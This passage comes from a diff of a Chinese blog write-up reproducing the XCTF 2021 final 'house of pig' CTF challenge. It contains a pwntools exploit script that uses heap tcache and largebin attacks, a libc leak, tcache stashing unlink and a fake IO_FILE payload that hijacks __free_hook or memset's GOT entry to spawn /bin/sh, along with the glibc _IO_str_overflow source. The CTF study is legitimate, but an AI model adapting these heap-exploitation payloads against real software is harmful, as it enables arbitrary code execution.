new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;&quot;
+    gdb.attach(p, cmd)
+    pause()
 
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</span><br><span class="line">new_size = <span class="number">2</span> * old_blen + <span class="number">100</span></span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size)</span><br><span class="line"></span><br><span class="line">old_buf = fp-&gt;_IO_buf_base</span><br><span class="line"><span class="built_in">memcpy</span> (new_buf, old_buf, old_blen)</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span> (old_buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen)</span><br></pre></td></tr></table></figure>
+host = &quot;&quot;
+port = 0
+p = process(&quot;./pig&quot;)
+# libc=ELF(&quot;./libc.so.6&quot;)
+#p = remote(host, port)
 
+def add(size, content): #0xa0-0x430
+    p.sendlineafter(&quot;Choice: &quot;, &quot;1&quot;)
+    p.sendlineafter(&quot;size: &quot;, str(size).encode())
+    p.sendafter(&quot;message: &quot;, content)
+def view(index):
+    p.sendlineafter(&quot;Choice: &quot;, &quot;2&quot;)
+    p.sendlineafter(&quot;index: &quot;, str(index).encode())
+def edit(index, content):
+    p.sendlineafter(&quot;Choice: &quot;, &quot;3&quot;)
+    p.sendlineafter(&quot;index: &quot;, str(index).encode())
+    p.sendafter(&quot;message: &quot;, content)
+def delet(index):
+    p.sendlineafter(&quot;Choice: &quot;, &quot;4&quot;)
+    p.sendlineafter(&quot;index: &quot;, str(index).encode())
+def change(role):
+    p.sendlineafter(&quot;Choice: &quot;, &quot;5&quot;)
+    if role == 1:
+        p.sendlineafter(&quot;user:\n&quot;, &quot;A39275120&quot;)
+    elif role == 2:
+        p.sendlineafter(&quot;user:\n&quot;, &quot;B3332073&quot;)
+    elif role == 3:
+        p.sendlineafter(&quot;user:\n&quot;, &quot;C75929410&quot;)
+
+#tcache 0xa0
+change(2)
+add(0xa0, cyclic(0x30))
+add(0xa0, cyclic(0x30))
+add(0xa0, cyclic(0x30))
+add(0xa0, cyclic(0x30))
+add(0xa0, cyclic(0x30))#2-&gt;4
+
+#unsortedbin-&gt;smallbin
+
+#tcache 0x160
+change(1)
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))
+add(0x160, cyclic(0x70))#1-&gt;6
+
+add(0x160, cyclic(0x70))#1-&gt;7
+change(2)
+add(0xa0, cyclic(0x30))#protect 2-&gt;5
+change(1)
+add(0x160, cyclic(0x70))#1-&gt;8
+
+#fill tcache 0x160
+delet(0)
+delet(1)
+delet(2)
+delet(3)
+delet(4)
+delet(5)
+delet(6)
+
+#fill tcache 0xa0 to 5
+change(2)
+delet(0)
+delet(1)
+delet(2)
+delet(3)
+delet(4)
+
+#split into unsorted bin
+change(1)
+delet(7)
+
+change(3)
+change(1)#to clear flag0
+view(7)#leak libc
+libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x219ce0
+free_hook = libc_base + 0x2204a8
+iolistall = libc_base + 0x21a680
+memset_got = libc_base + 0x219188
+log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+log.success(&quot;free_hook = &#123;&#125;&quot;.format(hex(free_hook)))
+log.success(&quot;iolistall = &#123;&#125;&quot;.format(hex(iolistall)))
+log.success(&quot;memset_got = &#123;&#125;&quot;.format(hex(memset_got)))
+
+change(3)
+add(0xb0, cyclic(0x30))#smallbin 0 = 1-&gt;7	
+change(1)
+add(0x160, cyclic(0x70))#into smallbin 1-&gt;9
+delet(8)
+change(3)
+add(0xb0, cyclic(0x30))#smallbin 1 = 1-&gt;8
+#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1
+
+#leak heap_base
+change(1)
+add(0x410, cyclic(0x160))#1-&gt;10
+add(0x410, cyclic(0x160))#1-&gt;11
+delet(10)
+add(0x430, cyclic(0x160))#1-&gt;12
+fixed_largebin_fd = libc_base + 0x21a0d0
+change(2)
+change(1)
+payload = cyclic(0x160)
+edit(10, payload)
+view(10)
+p.recvuntil(&quot;daaa&quot;)
+heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x13120
+log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+#fix it
+payload = p64(fixed_largebin_fd)*2 + cyclic(0x150)
+edit(10, payload)
+change(2)
+add(0x410, cyclic(0x160))# 2-&gt;6 largebin1
+
+#largebin attack
+change(2)
+add(0x410, cyclic(0x160))# 2-&gt;7 largebin2
+change(1)
+add(0x430, cyclic(0x160))# 1-&gt;13 protect
+change(2)
+add(0x410, cyclic(0x160))# 2-&gt;8 
+change(1)
+add(0x430, cyclic(0x160))# 1-&gt;14 protect
+change(2)
+add(0x420, cyclic(0x160))# 2-&gt;9 largebin3
+change(1)
+add(0x430, cyclic(0x160))# 1-&gt;15 protect
+
+change(2)
+delet(9)
+change(1)
+add(0x430, cyclic(0x160))# trigger largebin3 1-&gt;16
+
+#largebin attack1
+change(2)
+delet(6)
+payload = p64(heap_base+0x14e60) + p64(free_hook + 0x8-0x20)+cyclic(0x150)
+edit(9, payload)
+
+change(1)
+add(0x430, cyclic(0x160))# trigger largebin1 1-&gt;17
+
+change(3)
+add(0x410, cyclic(0x160))# memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2
+
+#fix largebin&amp;attck2
+change(2)
+delet(7)
+payload = p64(heap_base+0x14e60) + p64(iolistall-0x20)+cyclic(0x150)
+edit(9, payload)
+change(1)
+add(0x430, cyclic(0x160))# trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7
+#fix largebin
+change(2)
+payload = p64(heap_base+0x14e60)*2+cyclic(0x150)
+edit(7, payload)
+payload = p64(heap_base+0x13da0)*2+cyclic(0x150)
+edit(9, payload)
+
+#tcache smashing unlink
+change(3)
+add(0x420, cyclic(0x160)) #2-9 calloced
+
+change(1)
+payload = cyclic(0x40) + p64(heap_base+0x12ce0) + p64(free_hook-0x10)+cyclic(0x110)
+edit(8, payload)
+change(3)
+
+# debug()
+
+add(0xa0, cyclic(0x30))   #3-&gt;4
+#gift!
+p.recvuntil(&quot;01dwang&#39;s Gift:\n&quot;)
+#fake IOFILE
+payload = &quot;&quot;
+p.send(payload)
+
+debug()
+
+
+p.interactive()
+</code></pre>
+<h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><pre><code class="c">int _IO_str_overflow (FILE *fp, int c)
+&#123;
+  int flush_only = c == EOF;
+  size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    &#123;
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    &#125;
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))
+    &#123;
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+        &#123;
+          char *new_buf;
+          char *old_buf = fp-&gt;_IO_buf_base;
+          size_t old_blen = _IO_blen (fp);
+          size_t new_size = 2 * old_blen + 100;
+          if (new_size &lt; old_blen)
+            return EOF;
+          new_buf = malloc (new_size); // 1
+          if (new_buf == NULL)
+            &#123;
+              /*      __ferror(fp) = 1; */
+              return EOF;
+            &#125;
+          if (old_buf)
+            &#123;
+              memcpy (new_buf, old_buf, old_blen); // 2
+              free (old_buf); // 3
+              /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */
+              fp-&gt;_IO_buf_base = NULL;
+            &#125;
+          memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen); // 4
+ 
+          _IO_setb (fp, new_buf, new_buf + new_size, 1);
+          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+ 
+          fp-&gt;_IO_write_base = new_buf;
+          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+        &#125;
+    &#125;
+ 
+  if (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  return c;
+&#125;
+libc_hidden_def (_IO_str_overflow)
+</code></pre>
+<pre><code class="c">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base
+new_size = 2 * old_blen + 100
+new_buf = malloc (new_size)
+
+old_buf = fp-&gt;_IO_buf_base
+memcpy (new_buf, old_buf, old_blen)
+
+free (old_buf);
+
+memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen)
+</code></pre>
 <p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p>
 <p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p>
 <p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p>
 <p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_addr = heap_base+<span class="number">0x13da0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#write_ptr</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>)<span class="comment">#buf_base</span></span><br><span class="line">payload += p64(fake_IO_addr+<span class="number">0xe0</span>+<span class="number">0x1e</span>) <span class="comment">#buf_end</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x2166c0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x50d60</span>)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">fake_IO_addr = heap_base+0x13da0
+payload = p64(0)*3 + p64(0xffffffffffffffff) #write_ptr
+payload += p64(0)#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base
+payload += p64(fake_IO_addr+0xe0)#buf_base
+payload += p64(fake_IO_addr+0xe0+0x1e) #buf_end
+payload = payload.ljust(0xc8, b&#39;\x00&#39;)
+payload += p64(libc_base+0x2166c0)
+payload += b&#39;/bin/sh\x00&#39;+p64(0)+p64(libc_base+0x50d60)
+</code></pre>
 <h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p>
 <p>因此可以把memset的got当作一个__free_hook</p>
 <p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p>
